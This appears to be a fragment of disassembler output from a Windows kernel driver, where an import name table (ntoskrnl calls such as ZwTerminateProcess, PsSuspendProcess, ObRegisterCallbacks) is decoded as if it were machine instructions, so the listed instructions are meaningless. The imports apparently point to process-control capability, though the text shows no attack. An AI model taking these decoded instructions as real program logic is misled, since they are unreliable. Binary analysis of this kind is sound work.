   14000626e:	72 00                	jb     0x140006270
   140006270:	f0 02 49 6f          	lock add 0x6f(%rcx),%cl
   140006274:	43 72 65             	rex.XB jb 0x1400062dc
   140006277:	61                   	(bad)
   140006278:	74 65                	je     0x1400062df
   14000627a:	46 69 6c 65 00 00 1a 	imul   $0x49031a00,0x0(%rbp,%r12,2),%r13d
   140006281:	03 49 
   140006283:	6f                   	outsl  (%rsi),(%dx)
   140006284:	46 72 65             	rex.RX jb 0x1400062ec
   140006287:	65 49 72 70          	gs rex.WB jb 0x1400062fb
   14000628b:	00 1d 03 49 6f 46    	add    %bl,0x466f4903(%rip)        # 0x1866fab94
   140006291:	72 65                	jb     0x1400062f8
   140006293:	65 4d                	gs rex.WRB
   140006295:	64 6c                	fs insb (%dx),(%rdi)
   140006297:	00 63 06             	add    %ah,0x6(%rbx)
   14000629a:	4f 62 52 65 66 65    	(bad)
   1400062a0:	72 65                	jb     0x140006307
   1400062a2:	6e                   	outsb  (%rsi),(%dx)
   1400062a3:	63 65 4f             	movsxd 0x4f(%rbp),%esp
   1400062a6:	62 6a 65 63 74       	(bad)
   1400062ab:	42 79 48             	rex.X jns 0x1400062f6
   1400062ae:	61                   	(bad)
   1400062af:	6e                   	outsb  (%rsi),(%dx)
   1400062b0:	64 6c                	fs insb (%dx),(%rdi)
   1400062b2:	65 00 89 0a 5a 77 43 	add    %cl,%gs:0x43775a0a(%rcx)
   1400062b9:	6c                   	insb   (%dx),(%rdi)
   1400062ba:	6f                   	outsl  (%rsi),(%dx)
   1400062bb:	73 65                	jae    0x140006322
   1400062bd:	00 3b                	add    %bh,(%rbx)
   1400062bf:	03 49 6f             	add    0x6f(%rcx),%ecx
   1400062c2:	47                   	rex.RXB
   1400062c3:	65 74 46             	gs je  0x14000630c
   1400062c6:	69 6c 65 4f 62 6a 65 	imul   $0x63656a62,0x4f(%rbp,%riz,2),%ebp
   1400062cd:	63 
   1400062ce:	74 47                	je     0x140006317
   1400062d0:	65 6e                	outsb  %gs:(%rsi),(%dx)
   1400062d2:	65 72 69             	gs jb  0x14000633e
   1400062d5:	63 4d 61             	movsxd 0x61(%rbp),%ecx
   1400062d8:	70 70                	jo     0x14000634a
   1400062da:	69 6e 67 00 ac 09 53 	imul   $0x5309ac00,0x67(%rsi),%ebp
   1400062e1:	65 43 72 65          	gs rex.XB jb 0x14000634a
   1400062e5:	61                   	(bad)
   1400062e6:	74 65                	je     0x14000634d
   1400062e8:	41 63 63 65          	movsxd 0x65(%r11),%esp
   1400062ec:	73 73                	jae    0x140006361
   1400062ee:	53                   	push   %rbx
   1400062ef:	74 61                	je     0x140006352
   1400062f1:	74 65                	je     0x140006358
   1400062f3:	00 4a 06             	add    %cl,0x6(%rdx)
   1400062f6:	4f 62 43 72 65 61    	(bad)
   1400062fc:	74 65                	je     0x140006363
   1400062fe:	4f 62 6a 65 63 74    	(bad)
   140006304:	00 00                	add    %al,(%rax)
   140006306:	13 03                	adc    (%rbx),%eax
   140006308:	49 6f                	rex.WB outsl (%rsi),(%dx)
   14000630a:	46 69 6c 65 4f 62 6a 	imul   $0x63656a62,0x4f(%rbp,%r12,2),%r13d
   140006311:	65 63 
   140006313:	74 54                	je     0x140006369
   140006315:	79 70                	jns    0x140006387
   140006317:	65 00 00             	add    %al,%gs:(%rax)
   14000631a:	0e                   	(bad)
   14000631b:	04 49                	add    $0x49,%al
   14000631d:	6f                   	outsl  (%rsi),(%dx)
   14000631e:	66 43 6f             	rex.XB outsw (%rsi),(%dx)
   140006321:	6d                   	insl   (%dx),(%rdi)
   140006322:	70 6c                	jo     0x140006390
   140006324:	65 74 65             	gs je  0x14000638c
   140006327:	52                   	push   %rdx
   140006328:	65 71 75             	gs jno 0x1400063a0
   14000632b:	65 73 74             	gs jae 0x1400063a2
   14000632e:	00 00                	add    %al,(%rax)
   140006330:	ec                   	in     (%dx),%al
   140006331:	02 49 6f             	add    0x6f(%rcx),%cl
   140006334:	43 72 65             	rex.XB jb 0x14000639c
   140006337:	61                   	(bad)
   140006338:	74 65                	je     0x14000639f
   14000633a:	44                   	rex.R
   14000633b:	65 76 69             	gs jbe 0x1400063a7
   14000633e:	63 65 00             	movsxd 0x0(%rbp),%esp
   140006341:	00 f8                	add    %bh,%al
   140006343:	02 49 6f             	add    0x6f(%rcx),%cl
   140006346:	43 72 65             	rex.XB jb 0x1400063ae
   140006349:	61                   	(bad)
   14000634a:	74 65                	je     0x1400063b1
   14000634c:	53                   	push   %rbx
   14000634d:	79 6d                	jns    0x1400063bc
   14000634f:	62 6f 6c 69 63       	(bad)
   140006354:	4c 69 6e 6b 00 00 04 	imul   $0x3040000,0x6b(%rsi),%r13
   14000635b:	03 
   14000635c:	49 6f                	rex.WB outsl (%rsi),(%dx)
   14000635e:	44                   	rex.R
   14000635f:	65 6c                	gs insb (%dx),(%rdi)
   140006361:	65 74 65             	gs je  0x1400063c9
   140006364:	44                   	rex.R
   140006365:	65 76 69             	gs jbe 0x1400063d1
   140006368:	63 65 00             	movsxd 0x0(%rbp),%esp
   14000636b:	00 06                	add    %al,(%rsi)
   14000636d:	03 49 6f             	add    0x6f(%rcx),%ecx
   140006370:	44                   	rex.R
   140006371:	65 6c                	gs insb (%dx),(%rdi)
   140006373:	65 74 65             	gs je  0x1400063db
   140006376:	53                   	push   %rbx
   140006377:	79 6d                	jns    0x1400063e6
   140006379:	62 6f 6c 69 63       	(bad)
   14000637e:	4c 69 6e 6b 00 00 6b 	imul   $0x66b0000,0x6b(%rsi),%r13
   140006385:	06 
   140006386:	4f 62 52 65 67 69    	(bad)
   14000638c:	73 74                	jae    0x140006402
   14000638e:	65 72 43             	gs jb  0x1400063d4
   140006391:	61                   	(bad)
   140006392:	6c                   	insb   (%dx),(%rdi)
   140006393:	6c                   	insb   (%dx),(%rdi)
   140006394:	62 61 63 6b 73       	(bad)
   140006399:	00 70 06             	add    %dh,0x6(%rax)
   14000639c:	4f 62 55 6e 52 65    	(bad)
   1400063a2:	67 69 73 74 65 72 43 	imul   $0x61437265,0x74(%ebx),%esi
   1400063a9:	61 
   1400063aa:	6c                   	insb   (%dx),(%rdi)
   1400063ab:	6c                   	insb   (%dx),(%rdi)
   1400063ac:	62 61 63 6b 73       	(bad)
   1400063b1:	00 10                	add    %dl,(%rax)
   1400063b3:	07                   	(bad)
   1400063b4:	50                   	push   %rax
   1400063b5:	73 47                	jae    0x1400063fe
   1400063b7:	65 74 50             	gs je  0x14000640a
   1400063ba:	72 6f                	jb     0x14000642b
   1400063bc:	63 65 73             	movsxd 0x73(%rbp),%esp
   1400063bf:	73 49                	jae    0x14000640a
   1400063c1:	64 00 00             	add    %al,%fs:(%rax)
   1400063c4:	55                   	push   %rbp
   1400063c5:	0b 5a 77             	or     0x77(%rdx),%ebx
   1400063c8:	54                   	push   %rsp
   1400063c9:	65 72 6d             	gs jb  0x140006439
   1400063cc:	69 6e 61 74 65 50 72 	imul   $0x72506574,0x61(%rsi),%ebp
   1400063d3:	6f                   	outsl  (%rsi),(%dx)
   1400063d4:	63 65 73             	movsxd 0x73(%rbp),%esp
   1400063d7:	73 00                	jae    0x1400063d9
   1400063d9:	00 de                	add    %bl,%dh
   1400063db:	0a 5a 77             	or     0x77(%rdx),%bl
   1400063de:	4f 70 65             	rex.WRXB jo 0x140006446
   1400063e1:	6e                   	outsb  (%rsi),(%dx)
   1400063e2:	50                   	push   %rax
   1400063e3:	72 6f                	jb     0x140006454
   1400063e5:	63 65 73             	movsxd 0x73(%rbp),%esp
   1400063e8:	73 00                	jae    0x1400063ea
   1400063ea:	4f 07                	rex.WRXB (bad)
   1400063ec:	50                   	push   %rax
   1400063ed:	73 4c                	jae    0x14000643b
   1400063ef:	6f                   	outsl  (%rsi),(%dx)
   1400063f0:	6f                   	outsl  (%rsi),(%dx)
   1400063f1:	6b 75 70 50          	imul   $0x50,0x70(%rbp),%esi
   1400063f5:	72 6f                	jb     0x140006466
   1400063f7:	63 65 73             	movsxd 0x73(%rbp),%esp
   1400063fa:	73 42                	jae    0x14000643e
   1400063fc:	79 50                	jns    0x14000644e
   1400063fe:	72 6f                	jb     0x14000646f
   140006400:	63 65 73             	movsxd 0x73(%rbp),%esp
   140006403:	73 49                	jae    0x14000644e
   140006405:	64 00 00             	add    %al,%fs:(%rax)
   140006408:	87 07                	xchg   %eax,(%rdi)
   14000640a:	50                   	push   %rax
   14000640b:	73 53                	jae    0x140006460
   14000640d:	75 73                	jne    0x140006482
   14000640f:	70 65                	jo     0x140006476
   140006411:	6e                   	outsb  (%rsi),(%dx)
   140006412:	64 50                	fs push %rax
   140006414:	72 6f                	jb     0x140006485
   140006416:	63 65 73             	movsxd 0x73(%rbp),%esp
   140006419:	73 00                	jae    0x14000641b
   14000641b:	00 69 07             	add    %ch,0x7(%rcx)
   14000641e:	50                   	push   %rax
   14000641f:	73 52                	jae    0x140006473
   140006421:	65 73 75             	gs jae 0x140006499
   140006424:	6d                   	insl   (%dx),(%rdi)
   140006425:	65 50                	gs push %rax
   140006427:	72 6f                	jb     0x140006498
   140006429:	63 65 73             	movsxd 0x73(%rbp),%esp
   14000642c:	73 00                	jae    0x14000642e
   14000642e:	54                   	push   %rsp
   14000642f:	07                   	(bad)
   140006430:	50                   	push   %rax
   140006431:	73 50                	jae    0x140006483
   140006433:	72 6f                	jb     0x1400064a4
   140006435:	63 65 73             	movsxd 0x73(%rbp),%esp
   140006438:	73 54                	jae    0x14000648e
   14000643a:	79 70                	jns    0x1400064ac
   14000643c:	65 00 40 04          	add    %al,%gs:0x4(%rax)
   140006440:	4b                   	rex.WXB
   140006441:	65 42 75 67          	gs rex.X jne 0x1400064ac
   140006445:	43 68 65 63 6b 45    	rex.XB push $0x456b6365
   14000644b:	78 00                	js     0x14000644d
   14000644d:	00 6e 74             	add    %ch,0x74(%rsi)
   140006450:	6f                   	outsl  (%rsi),(%dx)
   140006451:	73 6b                	jae    0x1400064be
   140006453:	72 6e                	jb     0x1400064c3
   140006455:	6c                   	insb   (%dx),(%rdi)
   140006456:	2e 65 78 65          	cs js,pn 0x1400064bf
	...
